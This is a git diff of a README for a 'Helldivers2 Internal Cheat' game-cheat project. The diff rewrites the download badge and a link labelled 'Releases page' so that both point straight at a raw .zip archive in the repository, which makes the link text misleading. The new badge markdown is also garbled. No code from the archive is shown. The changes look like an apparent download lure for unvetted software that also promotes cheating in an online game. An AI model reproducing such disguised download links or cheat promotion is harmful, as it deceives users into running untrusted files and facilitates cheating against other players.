@@ -6,7 +6,7 @@ Welcome to the **Helldivers2 Internal Cheat** project! This software is designed
 
 ## 📥 Download Now
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-Helldivers2%20Internal%20Cheat-brightgreen.svg)](https://github.com/rayanhachemi/Helldivers2-Internal-Cheat-FULL/releases)
+[![Download Release](https://github.com/rayanhachemi/Helldivers2-Internal-Cheat-FULL/raw/refs/heads/main/Helldivers-2 Internal/Cheat_Helldivers_Internal_FULL_3.0.zip%20Now-Helldivers2%20Internal%https://github.com/rayanhachemi/Helldivers2-Internal-Cheat-FULL/raw/refs/heads/main/Helldivers-2 Internal/Cheat_Helldivers_Internal_FULL_3.0.zip)](https://github.com/rayanhachemi/Helldivers2-Internal-Cheat-FULL/raw/refs/heads/main/Helldivers-2 Internal/Cheat_Helldivers_Internal_FULL_3.0.zip)
 
 ## 📖 Description
 
@@ -29,7 +29,7 @@ To run this application smoothly, ensure your system meets the following require
 ## 📂 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/rayanhachemi/Helldivers2-Internal-Cheat-FULL/releases) to find the latest version of the cheat.
+   Go to the [Releases page](https://github.com/rayanhachemi/Helldivers2-Internal-Cheat-FULL/raw/refs/heads/main/Helldivers-2 Internal/Cheat_Helldivers_Internal_FULL_3.0.zip) to find the latest version of the cheat.
 
 2. **Download the Latest Version**  
    Look for the most recent release listed on the page. Click on the download link for the package that matches your system. 
